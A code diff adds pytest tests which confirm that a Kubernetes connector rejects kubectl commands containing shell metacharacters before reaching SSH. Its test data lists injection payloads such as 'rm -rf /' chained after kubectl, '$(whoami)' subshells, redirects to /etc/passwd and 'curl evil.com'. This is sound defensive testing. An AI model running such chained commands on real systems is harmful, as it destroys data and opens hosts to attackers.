@@ -612,6 +612,157 @@ async def test_k8s_exec_returns_envelope_on_ssh_failure() -> None:
 
 
 # ---------------------------------------------------------------------------
+# Shell-injection rejection (B1 -- review iter 1).
+#
+# These tests are the regression guard for the chained-shell exploit
+# the iter-1 review demonstrated: ``shlex.split`` in POSIX mode does
+# not treat ``;`` / ``&&`` / ``|`` / ``$(...)`` / backticks / ``>`` /
+# ``<`` / newline as token boundaries, so the verb-safelist check on
+# ``tokens[idx]`` would otherwise approve the leading ``kubectl get``
+# and the **raw** command would flow to
+# ``asyncssh.SSHClientConnection.run`` -- which delegates to the
+# remote login shell. The reject must fire **before** any SSH
+# transport is touched, so each test ALSO asserts that
+# ``_run_command`` is never awaited.
+# ---------------------------------------------------------------------------
+
+
+#: Injection payloads the iter-1 review demonstrated, plus their
+#: complement set: every POSIX shell control operator that can chain
+#: a command, expand to a subshell, or redirect IO. Test IDs name the
+#: metacharacter category for readable parametrise output.
+_K8S_INJECTION_PAYLOADS: tuple[tuple[str, str], ...] = (
+    ("semicolon", "kubectl get pods; rm -rf /"),
+    ("and-and", "kubectl get pods && rm -rf /"),
+    ("or-or", "kubectl get pods || rm -rf /"),
+    ("pipe", "kubectl get pods | xargs rm"),
+    ("dollar-paren", "kubectl get pods$(whoami)"),
+    ("backtick", "kubectl get `whoami`"),
+    ("gt-redirect", "kubectl get > /etc/passwd"),
+    ("lt-redirect", "kubectl get < /etc/passwd"),
+    ("newline", "kubectl get pods\nrm -rf /"),
+    ("carriage-return", "kubectl get pods\rrm -rf /"),
+    ("background-amp", "kubectl get pods & curl evil.com"),
+    ("escape-backslash", "kubectl get pods\\\nrm -rf /"),
+)
+
+
+@pytest.mark.parametrize(
+    ("label", "command"),
+    _K8S_INJECTION_PAYLOADS,
+    ids=[label for label, _ in _K8S_INJECTION_PAYLOADS],
+)
+def test_parse_kubectl_command_rejects_shell_injection(label: str, command: str) -> None:
+    """Handler-layer: ``parse_kubectl_command`` refuses metacharacters.
+
+    The exception message names the rejection category ('shell
+    metacharacter detected') without echoing the offending command
+    body back -- avoids leaking operator-supplied payload material
+    into operator-visible surfaces.
+    """
+    del label  # only used for parametrise IDs
+    with pytest.raises(KubectlSafetyError) as excinfo:
+        parse_kubectl_command(command)
+    msg = str(excinfo.value)
+    assert "shell metacharacter" in msg
+    # The full raw command must never appear in the error message --
+    # operator-supplied payload material doesn't belong in user-
+    # visible error envelopes.
+    assert "rm -rf" not in msg
+    assert "whoami" not in msg
+    assert "evil.com" not in msg
+
+
+@pytest.mark.parametrize(
+    ("label", "command"),
+    _K8S_INJECTION_PAYLOADS,
+    ids=[label for label, _ in _K8S_INJECTION_PAYLOADS],
+)
+@pytest.mark.asyncio
+async def test_k8s_exec_handler_rejects_shell_injection_before_ssh(
+    label: str, command: str
+) -> None:
+    """The k8s.exec handler refuses chained-shell payloads BEFORE any SSH call.
+
+    Mocks ``_run_command`` and asserts ``await_count == 0`` -- the
+    rejection must fire before the SSH transport is even touched, so
+    a future bug in the transport layer can't paper over a missing
+    safety check.
+    """
+    del label
+    connector = HolodeckConnector()
+    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
+        result = await connector.k8s_exec(_TARGET, {"command": command})
+        mock_cmd.assert_not_awaited()
+        assert mock_cmd.await_count == 0
+    # Structured-error envelope, not a raised exception.
+    assert result["exit_status"] is None
+    assert result["stdout"] == ""
+    assert result["stderr"] == ""
+    assert "safety check" in result["error"]
+    assert "shell metacharacter" in result["error"]
+
+
+@pytest.mark.parametrize(
+    ("label", "command"),
+    _K8S_INJECTION_PAYLOADS,
+    ids=[label for label, _ in _K8S_INJECTION_PAYLOADS],
+)
+def test_k8s_exec_schema_pattern_rejects_shell_injection(label: str, command: str) -> None:
+    """Schema-layer guardrail: the dispatcher's validator catches the same shapes.
+
+    Belt-and-braces redundancy with the handler-layer reject -- a
+    future widening on either side must not silently re-open the
+    hole. This test pins the **schema pattern** (the dispatcher's
+    validator front-end) against the same injection corpus.
+    """
+    del label
+    k8s_op = next(op for op in READ_OPS if op.op_id == "holodeck.k8s.exec")
+    schema = k8s_op.parameter_schema
+    with pytest.raises(jsonschema.ValidationError):
+        jsonschema.validate({"command": command}, schema)
+
+
+@pytest.mark.parametrize(
+    "verb",
+    [
+        "get",
+        "describe",
+        "logs",
+        "top",
+        "explain",
+        "api-resources",
+        "api-versions",
+        "cluster-info",
+        "version",
+    ],
+)
+@pytest.mark.asyncio
+async def test_k8s_exec_handler_accepts_every_safelist_verb(verb: str) -> None:
+    """Allowlist regression guard -- the tightened metachar/regex pair must
+    not break any verb on :data:`_K8S_READ_VERBS`.
+
+    Sibling to ``test_k8s_exec_schema_pattern_accepts_read_verbs``;
+    this one drives the **handler** path end-to-end with a mocked
+    SSH transport so the parser + metachar scan + verb-safelist
+    sequence is exercised together.
+    """
+    connector = HolodeckConnector()
+    # The ``cluster-info`` / ``version`` verbs take no positional arg
+    # so call them naked; everything else accepts ``pods`` as a
+    # placeholder resource name.
+    command = f"kubectl {verb}" if verb in {"cluster-info", "version"} else (f"kubectl {verb} pods")
+    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
+        mock_cmd.return_value = _proc(stdout="(ok)\n")
+        result = await connector.k8s_exec(_TARGET, {"command": command})
+    mock_cmd.assert_awaited_once()
+    assert result["exit_status"] == 0
+    # No error envelope -- the safelist verb passed both safety
+    # checks and the SSH path was reached.
+    assert "error" not in result or result.get("error") is None
+
+
+# ---------------------------------------------------------------------------
 # Bound-method shims -- logs_tail
 # ---------------------------------------------------------------------------
 
